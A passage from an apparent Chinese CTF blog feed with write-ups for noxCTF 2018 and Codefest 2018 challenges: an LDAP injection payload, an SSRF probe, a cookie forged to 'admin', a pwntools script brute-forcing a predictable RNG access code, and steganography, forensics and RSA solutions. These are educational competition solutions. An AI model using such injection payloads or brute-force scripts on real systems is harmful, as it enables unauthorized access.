src="/2018/09/10/noxCTF2018-web解析/1536549649887.png" alt="1536549649887">当然，也可以构造<code>http://54.152.220.222/word.php?page=*)(description=noxCTF*</code>,得到<code>flag</code>。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536549750782.png" alt="1536549750782"></p><p>最终答案：<code>noxCTF{K1NG_0F_LD4P}</code>    </p><p>此题相关资料链接：</p><p><a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">技术详解：基于Web的LDAP注入漏洞</a></p><p>Testing for LDAP Injection (OTG-INPVAL-006)：<br><code>https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-006)</code></p><h5 id="PSRF（未解决）"><a href="#PSRF（未解决）" class="headerlink" title="PSRF（未解决）"></a>PSRF（未解决）</h5><p><code>Swisslock is a new company in the Kubernetes security business.</code><br><code>Are they worth it?</code></p><p><a href="http://35.241.245.36" target="_blank" rel="noopener">http://35.241.245.36</a></p><p>打开是这么一个页面</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536560866989.png" alt="1536560866989"></p><p>测试</p><p>它将发送一个HTTP的<code>GET</code>请求 <code>http://35.241.245.36/api/v1/upload?url=http://your_url&amp;method=get</code><br>，它会返回一个图像名称，并且<code>SSRF</code>的结果将存储在<code>http://35.241.245.36/images/</code></p><p>挑战在页面底部有<code>kubernetes</code>徽标，如下面的屏幕截图，<code>IP</code>为<code>35.241.245.36</code>。</p><p><img src="/2018/09/10/noxCTF2018-web解析/1536561406912.png" alt="1536561406912"></p><p>后面没测试出啥。。本题未解出。</p><p>此处有国外大佬的另类解法，觉得会影响到使用docker容器配置的比赛环境（<code>orz</code>）</p><p><a href="https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn" target="_blank" rel="noopener">https://github.com/seadog007/noxCTF-2018-PSRF-as-Pwn</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;额~菜鸡一枚，五题只做出四题，感觉学到了新知识，写了下writeup。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Codefest2018 CTF 部分题目writeup</title>
    <link href="https://jianghuxia.github.io/2018/09/03/Codefest2018-CTF/"/>
    <id>https://jianghuxia.github.io/2018/09/03/Codefest2018-CTF/</id>
    <published>2018-09-02T16:11:04.000Z</published>
    <updated>2018-09-02T16:16:31.746Z</updated>
    
    <content type="html"><![CDATA[<p>实在是太无聊了，找了找比赛打，Codefest2018这个感觉跟以往的ctf比赛不同，感觉更偏向代码能力的考查，以下是这次自己做出来的题目writeup，菜鸡一枚。</p><a id="more"></a> <h4 id="Freebies"><a href="#Freebies" class="headerlink" title="Freebies"></a>Freebies</h4><p><strong>problem</strong></p><p>This one’s simple. Join the <a href="https://www.hackerrank.com/external_redirect?to=https://join.slack.com/t/codefest-ctf-18/shared_invite/enQtNDI2MjY1NDcyNDA2LTdiNTczZWUxMjJkZWUwMmQ5MTIxNzMzNDMwMjU5ZTU5MWFlYzU1MjY0MTE2NWI4ZTEyMWFkMTNlYzg3MTAxMTQ" target="_blank" rel="noopener">Slack channel</a> to get the flag.</p><p>这题算是签到题，但也是寻找了好一番，就不放答案了</p><h4 id="Fortune-Cookie"><a href="#Fortune-Cookie" class="headerlink" title="Fortune Cookie"></a>Fortune Cookie</h4><p><strong>problem</strong></p><p>H4k3r has heard that there is a secret hidden behind this <a href="https://www.hackerrank.com/external_redirect?to=http://34.216.132.109:8084/" target="_blank" rel="noopener">website</a>, but he is confused as to how to get access to it. Can you help him</p><p>这题，呃，很简单，该下cookies(说着简单，最后试了半天才发现是admin，不是Admin)</p><p><img src="/2018/09/03/Codefest2018-CTF/1535766037090.png" alt="1535766037090"></p><p><code>Who are you?=admin</code>即可</p><p><img src="/2018/09/03/Codefest2018-CTF/1535766076578.png" alt="1535766076578"></p><h4 id="Typing-Master"><a href="#Typing-Master" class="headerlink" title="Typing Master"></a>Typing Master</h4><p><strong>problem</strong></p><p>If you think you have it in you, connect now to 34.216.132.109 9093 and prove your mettle.</p><p>You will be presented with a simple typing task which is meant to check your typing speed.</p><p>For example, <em>Can you type ‘Z’ 10 times followed by ‘u’ 6 times, followed by the sum of their ASCII values?</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZZZZZZZZZZuuuuuu207</span><br></pre></td></tr></table></figure><p><strong>Input Format</strong></p><p><strong>Regarding input to the server</strong> - The question was designed keeping netcat in mind. Some users who are using other tools/language (eg, Python, PuTTY, TELNET) to connect to the server please note that they do not terminate the strings like netcat does. If you choose not to use netcat, the message you send to our server should terminate with a trailing newline (‘\n’) and nothing else.</p><p>nc下,先看看大概是啥样子的</p><p><img src="/2018/09/03/Codefest2018-CTF/1535879235703.png" alt="1535879235703"></p><p>发现每次访问，要求的都不一样，甚至返回的字符串也不一样，想了想，觉得还是一个脚本的事，需要正则一下即可</p><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"></span><br><span class="line">conn=remote(<span class="string">'34.216.132.109'</span>,<span class="number">9093</span>)</span><br><span class="line">text=conn.recv()</span><br><span class="line"><span class="keyword">print</span> text</span><br><span class="line"></span><br><span class="line">result = re.findall(<span class="string">r"'(\w)' (\d*)"</span>, text)</span><br><span class="line"><span class="comment">#print result</span></span><br><span class="line"><span class="comment">#print result[0][0]</span></span><br><span class="line"><span class="comment">#print result[0][1]</span></span><br><span class="line"></span><br><span class="line">str1=(result[<span class="number">0</span>][<span class="number">0</span>] * int(result[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line">str2=(result[<span class="number">1</span>][<span class="number">0</span>] * int(result[<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">str3=(str(ord(result[<span class="number">0</span>][<span class="number">0</span>]) +  ord(result[<span class="number">1</span>][<span class="number">0</span>])))</span><br><span class="line">S = <span class="string">''</span>.join(str1+str2+str3)</span><br><span class="line"><span class="keyword">print</span> S</span><br><span class="line"></span><br><span class="line">conn.sendline(S)</span><br><span class="line"><span class="keyword">print</span> conn.recv()</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2018/09/03/Codefest2018-CTF/1535879374237.png" alt="1535879374237"></p><p>最终答案：<code>CodefestCTF{1_s33_y0u_4r3_a_m4n_0f_sp33d}</code></p><h4 id="Web-BooK"><a href="#Web-BooK" class="headerlink" title="Web BooK"></a>Web BooK</h4><p><strong>problem</strong></p><p>It is expected to complete reading a book/novel to pass the course, but the students being clever avoid reading the whole book by going through the summary only.  Santosh(their course teacher) comes up with a new idea, he creates a magic book (you can only go to next page, that is: you can’t go to next page without reading the previous one and so on, and you can only start from the beginning).  It is know that the flag is hidden somewhere in the book, so the only way to pass the course is to read the whole book, find the flag. The book has 1000 pages so better be fast. And if you are lucky, you may even find the key on the very first page itself.  <a href="https://www.hackerrank.com/external_redirect?to=http://34.216.132.109:8083/fp/" target="_blank" rel="noopener">link to Web_BooK</a></p><p>打开网站，发现如下页面，点击next发现，都是没有规则的url</p><p><img src="/2018/09/03/Codefest2018-CTF/1535877269304.png" alt="1535877269304"></p><p>没办法，只能简单爬虫脚本写下，源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://34.216.132.109:8083'</span></span><br><span class="line">page = <span class="string">'/fp/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">True</span>):</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    r = s.get(url + page)</span><br><span class="line">    page_text = r.text</span><br><span class="line">    <span class="keyword">print</span> page_text</span><br><span class="line">    page = re.findall(<span class="string">'action="(.*?)"'</span>, page_text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">print</span> page, counter</span><br></pre></td></tr></table></figure><p>运行下</p><p><img src="/2018/09/03/Codefest2018-CTF/1535877528777.png" alt="1535877528777"></p><h4 id="Access-Denied"><a href="#Access-Denied" class="headerlink" title="Access Denied?"></a>Access Denied?</h4><p><strong>problem</strong></p><p>A school IT staff manages access to secure files by the method of access code. You are required to give your name and the access code, and the program will give out secret information.</p><p>It checks whether you already have an access code, generates new random one along with a new user ID alloted to the user, if that user is not found locally on the system. The access codes are known to have random expiration time (don’t know what goes on in their minds!), so don’t be surprised if you generated an access code just seconds ago and next time the same access code doesn’t work.</p><p>Johnny decided to go into the IT room and copy the program into his pendrive. You can find it <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/open?id=1KGoBbSNViJS8aZsh1Jjp8XbESv0E-Z4t" target="_blank" rel="noopener">here</a>.</p><p>Can you get the secret information out from the program? The service runs on 34.216.132.109 on port 9094.</p><p><strong>Constraints</strong></p><p>User ID / UID will be a positive integer</p><p>这题给了个school.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> user_functions</span><br><span class="line"></span><br><span class="line">user = raw_input(<span class="string">"Enter your name: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> user_functions.exists(user):</span><br><span class="line"><span class="comment"># generate a code</span></span><br><span class="line"></span><br><span class="line">count_ = user_functions.generateID(user)%<span class="number">1000</span><span class="comment">#User ID/ UID in the table is always positive</span></span><br><span class="line"></span><br><span class="line">generator = <span class="string">"xorshift"</span></span><br><span class="line">random.seed(generator)</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> user:</span><br><span class="line">ra = random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">rb = (ord(ch) * random.randint(<span class="number">1</span>, len(user))) ^ random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line"></span><br><span class="line">count += (ra + rb)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+count_):</span><br><span class="line">code = (code + random.randint(<span class="number">1</span>, i) ) % <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line">final = random.randint(<span class="number">1</span>,<span class="number">9</span>) * <span class="number">1000000</span> + code</span><br><span class="line"></span><br><span class="line"><span class="comment">#store it in the database</span></span><br><span class="line">user_functions.store(user, final)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="comment">#if user already exists, fetch access code</span></span><br><span class="line">final = user_functions.get_code(user)</span><br><span class="line"></span><br><span class="line">code = raw_input(<span class="string">"Enter your access code: "</span>).strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> code.isdigit():</span><br><span class="line"><span class="keyword">if</span> (int(code) == final):</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The flag is "</span> + user_functions.get_flag(user)</span><br><span class="line">exit()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Incorrect access code"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"The code must be an integer"</span></span><br><span class="line"></span><br><span class="line">code = (raw_input(<span class="string">"\nPlease enter the code: "</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\n###############################################"</span></span><br></pre></td></tr></table></figure><p>乍一看好像挺复杂的，其实不然，只需要爆破即可，简单分析下</p><p>起始变量<code>count</code> 是由我们输入的<code>user</code>确定的。如果我们每次测试时都提供相同的<code>user</code>，那么最终<code>count</code>变量也都是不变的；而<code>count_</code>变量嘛，虽然不知道到底是什么嘛，但是模<code>1000</code>得到的结果只可能是<code>[0,999]</code>；而<code>code</code>呢？由于<code>code</code>种子<code>xorshift</code>生成的，我们可以根据<code>count_</code>遍历<code>code</code>。只需要稍微改改给的school.py我们就可以暴力跑出答案。</p><p>核心代码其实也就是下面这个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    count_ = i</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the seed is always the same</span></span><br><span class="line">    generator = <span class="string">"xorshift"</span></span><br><span class="line">    random.seed(generator)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> user:</span><br><span class="line">        ra = random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">        rb = (ord(ch) * random.randint(<span class="number">1</span>, len(user))) ^ random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">        count += (ra + rb)/<span class="number">2</span></span><br><span class="line">    code = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+count_):</span><br><span class="line">        code = (code + random.randint(<span class="number">1</span>, i) ) % <span class="number">1000000</span></span><br><span class="line">    final = random.randint(<span class="number">1</span>,<span class="number">9</span>) * <span class="number">1000000</span> + code</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">list_code = []</span><br><span class="line">user = <span class="string">'jianghu'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">    count_ = i</span><br><span class="line"></span><br><span class="line">    generator = <span class="string">"xorshift"</span></span><br><span class="line">    random.seed(generator)</span><br><span class="line">    count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> user:</span><br><span class="line">        ra = random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line">        rb = (ord(ch) * random.randint(<span class="number">1</span>, len(user))) ^ random.randint(<span class="number">1</span>, ord(ch))</span><br><span class="line"></span><br><span class="line">        count += (ra + rb)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    code = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,count+count_):</span><br><span class="line">        code = (code + random.randint(<span class="number">1</span>, i) ) % <span class="number">1000000</span></span><br><span class="line"></span><br><span class="line">    final = random.randint(<span class="number">1</span>,<span class="number">9</span>) * <span class="number">1000000</span> + code</span><br><span class="line">    list_code.append(final)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> list_code</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">'34.216.132.109'</span>,<span class="number">9094</span>)</span><br><span class="line">con.recvuntil(<span class="string">'Enter your name: '</span>)</span><br><span class="line">con.sendline(user)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list_code:</span><br><span class="line">    text = con.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">not</span> <span class="keyword">in</span> text:</span><br><span class="line">        con.sendline(str(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> text,i</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure><p>运行结果如下</p><p><img src="/2018/09/03/Codefest2018-CTF/1535892298309.png" alt="1535892298309"></p><p>最终答案：<code>CodefestCTF{1_s33_y0u_4r3_a_m4n_0f_r4nd0mn3ss}</code></p><h4 id="It’s-Magic"><a href="#It’s-Magic" class="headerlink" title="It’s Magic"></a>It’s Magic</h4><p><strong>problem</strong></p><p>Repair given corrupted file to get the flag.  <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/file/d/10O4w6rtsUiCspM94qdXqvHeTj-4O0RfX/view?usp=sharing" target="_blank" rel="noopener">download file here</a></p><p>下载完毕后，拖到winhex里，拖到尾部发现<code>FFD9</code>，尝试改文件头，发现无效</p><p><img src="/2018/09/03/Codefest2018-CTF/1535879938784.png" alt="1535879938784"></p><p>遂尝试网上搜索在线修复受损图片，找到一个<a href="https://online.officerecovery.com/cn/fix-damaged-photo-file-online/" target="_blank" rel="noopener">工具网站</a></p><p>修复完成后，打开即有flag</p><p><img src="/2018/09/03/Codefest2018-CTF/1535880232974.png" alt="1535880232974"></p><p>最终答案：<code>CodefestCTF{mAgic_byTes}</code></p><h4 id="Hidden-Agenda"><a href="#Hidden-Agenda" class="headerlink" title="Hidden Agenda"></a>Hidden Agenda</h4><p><strong>problem</strong></p><p>Just before getting caught in Russia, MI-6 agent John Stegwal sent a mail to MI-6 containing two <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/drive/folders/1GHCN9eIRPtlMA0xGxnr44nY0boo-6DOx?usp=sharing" target="_blank" rel="noopener">visually similar images</a>. It is possible that the images contain information on how to access his findings. Can you find the message he sent?</p><p>给了两个<code>jpg</code>文件：<code>image1.jpg</code>与<code>image2.jpg</code>。</p><p>先用<code>StegSolve</code>将<code>image1.jpg</code>与<code>image2.jpg</code>来次<code>xor</code>，发现有个二维码的痕迹，保存为<code>solved.bmp</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535769690535.png" alt="1535769690535"></p><p>将<code>solved.bmp</code>与<code>image1.jpg</code>再来一次MUL，得到一个可扫的清晰二维码</p><p><img src="/2018/09/03/Codefest2018-CTF/1535769505500.png" alt="1535769505500"></p><p>扫出来是个网址<code>https://drive.google.com/file/d/13chbULOlKaOM_jI8_RaxECZ0xzJUg7Y4/view</code>，打开后，有张图片，下载下来，打开后可以看到清晰的<code>flag{</code>字样，然后，没然后了，这张图片只有<code>flag{</code>（那时候看到flag，开心极了，贼坑）</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882244230.png" alt="1535882244230"></p><p>没事，我吃柠檬。谷歌了下，找了找有关<code>jpg</code>图片隐写，找到了个<code>jsteg</code>，哟，试试</p><p>先试试<code>image1.jpg</code>，试出东西来了</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882176697.png" alt="1535882176697"></p><p>得到了个<code>flg.exe</code>，<code>winhex</code>看下，没看懂是啥</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882473635.png" alt="1535882473635"></p><p><code>file</code>下，发现是个<code>MP3</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535882547718.png" alt="1535882547718"></p><p>改后缀名，听了听，这是鸟叫声？<code>exm</code>?拖到<code>Adobe Audition CC2017</code>试试，查看了下频谱图</p><p><img src="/2018/09/03/Codefest2018-CTF/1535882938272.png" alt="1535882938272"></p><p>得到最终答案：<code>CodefestCTF{0b5cur17y &gt; 53cur17y}</code></p><h4 id="Thunder"><a href="#Thunder" class="headerlink" title="Thunder"></a>Thunder</h4><p>此题给了个流量包<code>thunder.pcap</code>，包不大，分析发现好几个<code>flag.jpg</code>，但是都是不完整的。</p><p><img src="/2018/09/03/Codefest2018-CTF/1535880958735.png" alt="1535880958735">尝试根据<code>jpg</code>文件的文件格式来拼图。先导出<code>http</code>对象，删除重复的。此题有个坑点，不可以按照分组序号的大小来拼，必须按照<code>TCP</code>流所显示的时间依小到大排序，然后拼好即可。</p><p><img src="/2018/09/03/Codefest2018-CTF/1535773565813.png" alt="1535773565813"></p><p>人懒，写了个<code>bat</code>脚本<code>1.bat</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type flag*.jpg&gt;&gt;all.jpg</span><br></pre></td></tr></table></figure><p>以下是<code>all.jpg</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535880779671.png" alt="1535880779671"></p><p>得到最终答案：<code>CodefestCTF{AP_is_amazing}</code></p><h4 id="Polyglot"><a href="#Polyglot" class="headerlink" title="Polyglot"></a>Polyglot</h4><p><strong>problem</strong></p><p>Chetu writes code with weird whitespace, and nobody knows why. He uses his own <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/open?id=12pZCXtDxvGqZUEzaZ-I_3Md-bPizUILT" target="_blank" rel="noopener">C interpreter</a>, which is probably the only thing that can handle his absurd code. He insists its more secure this way. Since no one ever believes him, he demonstrated his technique on <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/open?id=17ORWMNSOodeEarjuYDXHswlC_6t_kH_A" target="_blank" rel="noopener">this vulnerable code</a>.  Can you get the flag?</p><p>这题贼有意思，贼好玩。题目给了两个文件，但是做这题，我只用了<code>c</code>代码的文件，另外一个<code>elf</code>都没看。</p><p>首先我们看看<code>c</code>代码：</p><p><img src="/2018/09/03/Codefest2018-CTF/1535893121359.png" alt="1535893121359"></p><p>会发现，这些数字排序，怎么都是空那么多格子的呢？奇怪，但是突然想起了写<code>python</code>脚本时，会因为空格和<code>tab</code>混淆而报错，下意识看看这些空白字符是由什么构成的。<code>Notepad++</code>有个功能</p><p><img src="/2018/09/03/Codefest2018-CTF/1535893522278.png" alt="1535893522278"></p><p>果然，这些空白字符是由不同的空格字符和制表符组成。尝试先用脚本读读</p><p><img src="/2018/09/03/Codefest2018-CTF/1535894260379.png" alt="1535894260379"></p><p>果然，猜想是正确的，那么现在需要提取下这些空白的字符。想到了正则表达式，其中<code>\s</code>表示只要出现空白就匹配。但是匹配完后有什么用了？随即想到有没可能是<code>0</code>,<code>1</code>替换，到时候来个二进制转换<code>ASCII</code>可见字符。尝试一波，先匹配试试，然后<code>‘\t’</code>替换成<code>1</code>，<code>‘ ’</code>替换成<code>0</code>，得到了想要的答案</p><p><img src="/2018/09/03/Codefest2018-CTF/1535894689021.png" alt="1535894689021"></p><p>最终答案：<code>CodefestCTF{sP4c3S AnD\tAb5}</code></p><h4 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h4><p><strong>problem</strong></p><p>Garry encrypted a message with his public key and mailed it to Monika. Sure Garry is an idiot. The intercepted mail is given below as seen from Monika’s side. Decrypt the message to get the key.  <a href="https://www.hackerrank.com/external_redirect?to=https://drive.google.com/file/d/1T9mCsfp-QZFnas6scLSUx7cg9yYmT8hH/view?usp=sharing" target="_blank" rel="noopener">interceptedMail.eml</a></p><p>下载文件后，发现<code>eml</code>中存在<code>zip</code>，<code>base64</code>解码下</p><p><img src="/2018/09/03/Codefest2018-CTF/1535897369171.png" alt="1535897369171"></p><p>有两个文件，<code>flag.enc</code>是密文，但是私钥哪去了呢？其实在下面那个文件里。</p><p><img src="/2018/09/03/Codefest2018-CTF/1535895884842.png" alt="1535895884842"></p><p>其中<code>Public_Key_Encryption_.docx</code>实际上是是个压缩包，<code>winhex</code>下看到了<code>PK</code>的头</p><p><img src="/2018/09/03/Codefest2018-CTF/1535895863184.png" alt="1535895863184"></p><p>改后缀名，解压。寻找一番没找到私钥。最后才发现，在解压文件中<code>word\media\</code>，存在三张图片</p><p><img src="/2018/09/03/Codefest2018-CTF/1535896502425.png" alt="1535896502425"></p><p>其中的<code>image1.png</code>的尾部存在私钥<img src="/2018/09/03/Codefest2018-CTF/1535896553352.png" alt="1535896553352"></p><p>那么，提取出来，保存为<code>private.pem</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535897514713.png" alt="1535897514713"></p><p>额，<code>openssl</code>解密下，执行命令<code>openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txt</code></p><p><img src="/2018/09/03/Codefest2018-CTF/1535897143197.png" alt="1535897143197"></p><p>最终答案：<code>CodefestCTF{kristeinStewart_is_5EXY}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;实在是太无聊了，找了找比赛打，Codefest2018这个感觉跟以往的ctf比赛不同，感觉更偏向代码能力的考查，以下是这次自己做出来的题目writeup，菜鸡一枚。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://jianghuxia.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>一次网络流量分析引发的思考</title>
    <link href="https://jianghuxia.github.io/2018/08/31/%E4%B8%80%E6%AC%A1%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%BC%95%E8%B5%B7%E7%9A%84%E5%88%86%E6%9E%90/"/>
    <id>https://jianghuxia.github.io/2018/08/31/一次网络流量分析引起的分析/</id>
    <published>2018-08-31T10:34:39.000Z</published>
    <updated>2018-10-23T10:13:12.993Z</updated>
    
